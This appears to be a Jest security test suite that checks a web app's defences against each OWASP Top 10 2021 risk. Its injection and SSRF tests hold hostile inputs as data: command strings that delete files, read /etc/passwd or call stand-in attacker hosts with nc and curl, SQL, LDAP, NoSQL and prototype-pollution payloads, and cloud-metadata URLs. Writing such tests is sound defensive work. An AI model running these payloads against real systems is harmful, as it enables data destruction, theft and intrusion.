/**
 * OWASP Top 10 Security Test Suite
 * Tests for the most critical web application security risks
 */

import { createAuthenticatedRequest } from '@/test/utils/api-test-helpers';
import { POST as signInHandler } from '@/app/api/auth/signin/route';
import { POST as chatHandler } from '@/app/api/ai/chat/route';
import { POST as uploadHandler } from '@/app/api/files/upload/route';
import { jest } from '@jest/globals';

describe('OWASP Top 10 Security Tests', () => {
  describe('A01:2021 – Broken Access Control', () => {
    it('should prevent horizontal privilege escalation', async () => {
      // User A trying to access User B's data
      const request = createAuthenticatedRequest('http://localhost:3000/api/users/user-b-id', {
        method: 'GET',
        userId: 'user-a-id',
      });

      const response = await fetch(request);
      expect(response.status).toBe(403);
    });

    it('should prevent vertical privilege escalation', async () => {
      // Regular user trying to access admin endpoints
      const request = createAuthenticatedRequest('http://localhost:3000/api/admin/users', {
        method: 'GET',
        userId: 'regular-user-id',
      });

      const response = await fetch(request);
      expect(response.status).toBe(403);
    });

    it('should enforce organization boundaries', async () => {
      // User from Org A trying to access Org B's data
      const request = createAuthenticatedRequest('http://localhost:3000/api/organizations/org-b/data', {
        method: 'GET',
        userId: 'user-from-org-a',
      });

      const response = await fetch(request);
      expect(response.status).toBe(403);
    });

    it('should prevent IDOR (Insecure Direct Object Reference)', async () => {
      // Trying to access resources by guessing IDs
      const guessedIds = [
        'conv-00000001',
        'conv-99999999',
        'conv-admin',
        '../../../etc/passwd',
      ];

      for (const id of guessedIds) {
        const request = createAuthenticatedRequest(`http://localhost:3000/api/conversations/${id}`, {
          method: 'GET',
        });

        const response = await fetch(request);
        expect([403, 404]).toContain(response.status);
      }
    });
  });

  describe('A02:2021 – Cryptographic Failures', () => {
    it('should not store passwords in plain text', async () => {
      // Intercept database calls
      const dbSpy = jest.spyOn(require('@/lib/supabase/client'), 'createClient');

      await signInHandler(new Request('http://localhost:3000/api/auth/signin', {
        method: 'POST',
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'MySecurePassword123!',
        }),
      }));

      // Verify password is never stored directly
      const calls = dbSpy.mock.calls;
      calls.forEach(call => {
        const stringified = JSON.stringify(call);
        expect(stringified).not.toContain('MySecurePassword123!');
      });
    });

    it('should encrypt sensitive data at rest', async () => {
      const encryptionSpy = jest.spyOn(require('@/lib/security/encryption'), 'encrypt');

      // Store sensitive data
      const sensitiveData = {
        ssn: '123-45-6789',
        creditCard: '4111111111111111',
        apiKey: 'sk_live_secret123',
      };

      const request = createAuthenticatedRequest('http://localhost:3000/api/profile/update', {
        method: 'POST',
        body: sensitiveData,
      });

      await fetch(request);

      // Verify encryption was called for sensitive fields
      expect(encryptionSpy).toHaveBeenCalledWith(
        expect.stringContaining('123-45-6789')
      );
    });

    it('should use secure communication (HTTPS)', async () => {
      const request = new Request('http://localhost:3000/api/auth/signin', {
        method: 'POST',
        headers: {
          'X-Forwarded-Proto': 'http',
        },
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'password',
        }),
      });

      const response = await signInHandler(request);
      
      if (process.env['NODE_ENV'] === 'production') {
        expect(response.status).toBe(403);
        const data = await response.json();
        expect(data.error).toContain('HTTPS required');
      }
    });

    it('should properly handle cryptographic errors', async () => {
      // Mock encryption failure
      jest.spyOn(require('@/lib/security/encryption'), 'encrypt')
        .mockRejectedValueOnce(new Error('Encryption failed'));

      const request = createAuthenticatedRequest('http://localhost:3000/api/secure-data', {
        method: 'POST',
        body: { sensitive: 'data' },
      });

      const response = await fetch(request);
      expect(response.status).toBe(500);
      
      // Should not leak cryptographic details
      const data = await response.json();
      expect(data.error).not.toContain('Encryption failed');
      expect(data.error).toBe('Internal server error');
    });
  });

  describe('A03:2021 – Injection', () => {
    it('should prevent SQL injection', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users WHERE 't'='t",
      ];

      for (const payload of sqlInjectionPayloads) {
        const request = createAuthenticatedRequest('http://localhost:3000/api/search', {
          method: 'POST',
          body: { query: payload },
        });

        const response = await fetch(request);
        
        // Should not cause server error
        expect(response.status).not.toBe(500);
        
        // Verify no data breach occurred
        if (response.status === 200) {
          const data = await response.json();
          expect(data).not.toContain('password');
          expect(data).not.toContain('email');
        }
      }
    });

    it('should prevent NoSQL injection', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.password.length > 0' },
      ];

      for (const payload of noSqlPayloads) {
        const request = createAuthenticatedRequest('http://localhost:3000/api/users/search', {
          method: 'POST',
          body: { filter: payload },
        });

        const response = await fetch(request);
        expect(response.status).toBe(400); // Should reject invalid filters
      }
    });

    it('should prevent command injection', async () => {
      const commandPayloads = [
        'test.pdf; rm -rf /',
        'file.txt && cat /etc/passwd',
        '| nc attacker.com 1234',
        '`curl http://evil.com/steal`',
      ];

      for (const payload of commandPayloads) {
        const request = createAuthenticatedRequest('http://localhost:3000/api/files/process', {
          method: 'POST',
          body: { filename: payload },
        });

        const response = await fetch(request);
        
        // Should validate filenames
        expect(response.status).toBe(400);
        const data = await response.json();
        expect(data.error).toContain('Invalid filename');
      }
    });

    it('should prevent LDAP injection', async () => {
      const ldapPayloads = [
        '*)(uid=*))(|(uid=*',
        'admin)(&(password=*))',
        '*)(mail=*))%00',
      ];

      for (const payload of ldapPayloads) {
        const request = createAuthenticatedRequest('http://localhost:3000/api/ldap/search', {
          method: 'POST',
          body: { username: payload },
        });

        const response = await fetch(request);
        expect([400, 404]).toContain(response.status);
      }
    });

    it('should use parameterized queries', async () => {
      const dbSpy = jest.spyOn(require('@/lib/supabase/client').createClient().from(), 'select');

      const request = createAuthenticatedRequest('http://localhost:3000/api/users/search', {
        method: 'POST',
        body: { email: 'test@example.com' },
      });

      await fetch(request);

      // Verify parameterized queries are used
      expect(dbSpy).toHaveBeenCalled();
      const calls = dbSpy.mock.calls;
      
      // Should use .eq() methods, not string concatenation
      expect(calls.some(call => call[0].includes('eq'))).toBe(true);
    });
  });

  describe('A04:2021 – Insecure Design', () => {
    it('should implement secure password recovery flow', async () => {
      // Request password reset
      const resetRequest = await fetch('http://localhost:3000/api/auth/reset-password', {
        method: 'POST',
        body: JSON.stringify({ email: 'test@example.com' }),
      });

      expect(resetRequest.status).toBe(200);
      
      // Should not reveal if email exists
      const data = await resetRequest.json();
      expect(data.message).toBe('If the email exists, a reset link has been sent');
      
      // Same response for non-existent email
      const nonExistentRequest = await fetch('http://localhost:3000/api/auth/reset-password', {
        method: 'POST',
        body: JSON.stringify({ email: 'nonexistent@example.com' }),
      });
      
      const nonExistentData = await nonExistentRequest.json();
      expect(nonExistentData.message).toBe('If the email exists, a reset link has been sent');
    });

    it('should implement account lockout after failed attempts', async () => {
      const email = 'lockout-test@example.com';
      
      // Make multiple failed login attempts
      for (let i = 0; i < 6; i++) {
        await signInHandler(new Request('http://localhost:3000/api/auth/signin', {
          method: 'POST',
          body: JSON.stringify({
            email,
            password: 'wrong-password',
          }),
        }));
      }

      // Next attempt should be locked out
      const lockedResponse = await signInHandler(new Request('http://localhost:3000/api/auth/signin', {
        method: 'POST',
        body: JSON.stringify({
          email,
          password: 'correct-password',
        }),
      }));

      expect(lockedResponse.status).toBe(429);
      const data = await lockedResponse.json();
      expect(data.error).toContain('Too many failed attempts');
    });

    it('should implement secure session management', async () => {
      // Login to get session
      const loginResponse = await signInHandler(new Request('http://localhost:3000/api/auth/signin', {
        method: 'POST',
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'password123',
        }),
      }));

      const session = await loginResponse.json();
      
      // Session should have security attributes
      expect(session.session).toMatchObject({
        expires_at: expect.any(String),
        expires_in: expect.any(Number),
      });
      
      // Session should expire
      expect(session.session.expires_in).toBeLessThanOrEqual(86400); // Max 24 hours
    });
  });

  describe('A05:2021 – Security Misconfiguration', () => {
    it('should not expose sensitive headers', async () => {
      const response = await fetch('http://localhost:3000/api/health');
      
      // Should not expose server details
      expect(response.headers.get('Server')).toBeNull();
      expect(response.headers.get('X-Powered-By')).toBeNull();
      
      // Should include security headers
      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(response.headers.get('X-Frame-Options')).toBe('DENY');
      expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
    });

    it('should not expose detailed error messages in production', async () => {
      const originalEnv = process.env['NODE_ENV'];
      process.env['NODE_ENV'] = 'production';

      // Cause an error
      const request = createAuthenticatedRequest('http://localhost:3000/api/error-test', {
        method: 'POST',
        body: { causeError: true },
      });

      const response = await fetch(request);
      const data = await response.json();

      // Should not expose stack traces or internal details
      expect(data.stack).toBeUndefined();
      expect(data.error).not.toContain('at Function');
      expect(data.error).not.toContain('/src/');

      process.env['NODE_ENV'] = originalEnv;
    });

    it('should disable unnecessary HTTP methods', async () => {
      const unnecessaryMethods = ['TRACE', 'TRACK', 'OPTIONS'];

      for (const method of unnecessaryMethods) {
        const response = await fetch('http://localhost:3000/api/test', {
          method,
        });

        expect(response.status).toBe(405); // Method Not Allowed
      }
    });

    it('should implement proper CORS configuration', async () => {
      const response = await fetch('http://localhost:3000/api/test', {
        headers: {
          'Origin': 'http://evil.com',
        },
      });

      // Should not allow arbitrary origins
      const corsHeader = response.headers.get('Access-Control-Allow-Origin');
      expect(corsHeader).not.toBe('*');
      expect(corsHeader).not.toBe('http://evil.com');
    });
  });

  describe('A06:2021 – Vulnerable and Outdated Components', () => {
    it('should check for known vulnerabilities in dependencies', async () => {
      // This would typically be done via npm audit in CI/CD
      const auditResponse = await fetch('http://localhost:3000/api/admin/security/audit');
      
      if (auditResponse.status === 200) {
        const audit = await auditResponse.json();
        expect(audit.vulnerabilities.high).toBe(0);
        expect(audit.vulnerabilities.critical).toBe(0);
      }
    });

    it('should validate file upload types and sizes', async () => {
      const maliciousFiles = [
        { name: 'evil.exe', type: 'application/x-executable' },
        { name: 'script.js', type: 'application/javascript' },
        { name: 'large.bin', size: 100 * 1024 * 1024 }, // 100MB
      ];

      for (const file of maliciousFiles) {
        const formData = new FormData();
        formData.append('file', new Blob(['content'], { type: file.type }), file.name);

        const response = await fetch('http://localhost:3000/api/files/upload', {
          method: 'POST',
          body: formData,
        });

        expect(response.status).toBe(400);
        const data = await response.json();
        expect(data.error).toMatch(/Invalid file type|File too large/);
      }
    });
  });

  describe('A07:2021 – Identification and Authentication Failures', () => {
    it('should enforce strong password requirements', async () => {
      const weakPasswords = [
        'password',
        '12345678',
        'qwerty123',
        'admin123',
        'Test123', // Too short
      ];

      for (const password of weakPasswords) {
        const response = await fetch('http://localhost:3000/api/auth/signup', {
          method: 'POST',
          body: JSON.stringify({
            email: 'test@example.com',
            password,
          }),
        });

        expect(response.status).toBe(400);
        const data = await response.json();
        expect(data.error).toContain('Password');
      }
    });

    it('should implement multi-factor authentication', async () => {
      // Login with MFA enabled account
      const loginResponse = await signInHandler(new Request('http://localhost:3000/api/auth/signin', {
        method: 'POST',
        body: JSON.stringify({
          email: 'mfa-user@example.com',
          password: 'SecurePassword123!',
        }),
      }));

      const data = await loginResponse.json();
      
      // Should require MFA
      expect(data.requiresMfa).toBe(true);
      expect(data.mfaChallenge).toBeDefined();
      expect(data.session).toBeUndefined(); // No session until MFA complete
    });

    it('should prevent credential stuffing attacks', async () => {
      const stolenCredentials = [
        { email: 'user1@example.com', password: 'password123' },
        { email: 'user2@example.com', password: 'qwerty456' },
        { email: 'user3@example.com', password: 'admin789' },
      ];

      // Rapid automated attempts
      const attempts = stolenCredentials.map(cred =>
        signInHandler(new Request('http://localhost:3000/api/auth/signin', {
          method: 'POST',
          body: JSON.stringify(cred),
        }))
      );

      const responses = await Promise.all(attempts);
      
      // Should detect and block automated attempts
      const blockedCount = responses.filter(r => r.status === 429).length;
      expect(blockedCount).toBeGreaterThan(0);
    });

    it('should implement secure session invalidation', async () => {
      const sessionToken = 'test-session-token';
      
      // Logout
      const logoutResponse = await fetch('http://localhost:3000/api/auth/signout', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${sessionToken}`,
        },
      });

      expect(logoutResponse.status).toBe(200);

      // Try to use the same token
      const afterLogoutResponse = await fetch('http://localhost:3000/api/user/profile', {
        headers: {
          'Authorization': `Bearer ${sessionToken}`,
        },
      });

      expect(afterLogoutResponse.status).toBe(401);
    });
  });

  describe('A08:2021 – Software and Data Integrity Failures', () => {
    it('should verify webhook signatures', async () => {
      const webhookPayload = {
        event: 'payment.completed',
        data: { amount: 100 },
      };

      // Without signature
      const unsignedResponse = await fetch('http://localhost:3000/api/webhooks/stripe', {
        method: 'POST',
        body: JSON.stringify(webhookPayload),
      });

      expect(unsignedResponse.status).toBe(401);

      // With invalid signature
      const invalidSignResponse = await fetch('http://localhost:3000/api/webhooks/stripe', {
        method: 'POST',
        headers: {
          'Stripe-Signature': 'invalid-signature',
        },
        body: JSON.stringify(webhookPayload),
      });

      expect(invalidSignResponse.status).toBe(401);
    });

    it('should validate data integrity', async () => {
      // Attempt to tamper with signed data
      const tamperedRequest = createAuthenticatedRequest('http://localhost:3000/api/secure-action', {
        method: 'POST',
        body: {
          action: 'transfer',
          amount: 1000,
          signature: 'old-valid-signature',
        },
      });

      const response = await fetch(tamperedRequest);
      expect(response.status).toBe(400);
      
      const data = await response.json();
      expect(data.error).toContain('Invalid signature');
    });

    it('should implement secure deserialization', async () => {
      const maliciousPayloads = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
      ];

      for (const payload of maliciousPayloads) {
        const response = await fetch('http://localhost:3000/api/data/import', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: payload,
        });

        // Should safely parse without prototype pollution
        expect(response.status).not.toBe(500);
        
        // Verify prototype wasn't polluted
        const obj = {};
        expect((obj as any).isAdmin).toBeUndefined();
      }
    });
  });

  describe('A09:2021 – Security Logging and Monitoring Failures', () => {
    it('should log security events', async () => {
      const auditSpy = jest.spyOn(require('@/lib/audit/logger'), 'logSecurityEvent');

      // Failed login attempt
      await signInHandler(new Request('http://localhost:3000/api/auth/signin', {
        method: 'POST',
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'wrong-password',
        }),
      }));

      expect(auditSpy).toHaveBeenCalledWith({
        event: 'FAILED_LOGIN_ATTEMPT',
        email: 'test@example.com',
        ip: expect.any(String),
        userAgent: expect.any(String),
        timestamp: expect.any(String),
      });
    });

    it('should detect and alert on suspicious patterns', async () => {
      const alertSpy = jest.spyOn(require('@/lib/monitoring/alerts'), 'sendAlert');

      // Multiple failed logins from same IP
      for (let i = 0; i < 10; i++) {
        await signInHandler(new Request('http://localhost:3000/api/auth/signin', {
          method: 'POST',
          headers: {
            'X-Forwarded-For': '192.168.1.100',
          },
          body: JSON.stringify({
            email: `user${i}@example.com`,
            password: 'wrong-password',
          }),
        }));
      }

      expect(alertSpy).toHaveBeenCalledWith({
        type: 'BRUTE_FORCE_DETECTED',
        source: '192.168.1.100',
        severity: 'high',
      });
    });

    it('should not log sensitive data', async () => {
      const logSpy = jest.spyOn(console, 'log');
      const errorSpy = jest.spyOn(console, 'error');

      await signInHandler(new Request('http://localhost:3000/api/auth/signin', {
        method: 'POST',
        body: JSON.stringify({
          email: 'test@example.com',
          password: 'SuperSecret123!',
          creditCard: '4111111111111111',
        }),
      }));

      // Check all console outputs
      const allLogs = [
        ...logSpy.mock.calls.flat(),
        ...errorSpy.mock.calls.flat(),
      ].join(' ');

      // Should not contain sensitive data
      expect(allLogs).not.toContain('SuperSecret123!');
      expect(allLogs).not.toContain('4111111111111111');
    });
  });

  describe('A10:2021 – Server-Side Request Forgery (SSRF)', () => {
    it('should prevent SSRF attacks', async () => {
      const ssrfPayloads = [
        'http://localhost:6379', // Redis
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'file:///etc/passwd',
        'http://127.0.0.1:8080/admin',
        'gopher://localhost:8080',
      ];

      for (const url of ssrfPayloads) {
        const request = createAuthenticatedRequest('http://localhost:3000/api/fetch-url', {
          method: 'POST',
          body: { url },
        });

        const response = await fetch(request);
        expect(response.status).toBe(400);
        
        const data = await response.json();
        expect(data.error).toContain('Invalid URL');
      }
    });

    it('should whitelist allowed external domains', async () => {
      const request = createAuthenticatedRequest('http://localhost:3000/api/fetch-url', {
        method: 'POST',
        body: { url: 'https://random-domain.com/api/data' },
      });

      const response = await fetch(request);
      expect(response.status).toBe(403);
      
      const data = await response.json();
      expect(data.error).toContain('Domain not allowed');
    });

    it('should prevent DNS rebinding attacks', async () => {
      // Mock DNS resolution changing mid-request
      const request = createAuthenticatedRequest('http://localhost:3000/api/fetch-url', {
        method: 'POST',
        body: { url: 'https://rebind.domain.com/data' },
      });

      const response = await fetch(request);
      
      // Should validate resolved IP isn't internal
      if (response.status === 200) {
        const validation = response.headers.get('X-Validated-IP');
        expect(validation).not.toMatch(/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/);
      }
    });
  });
});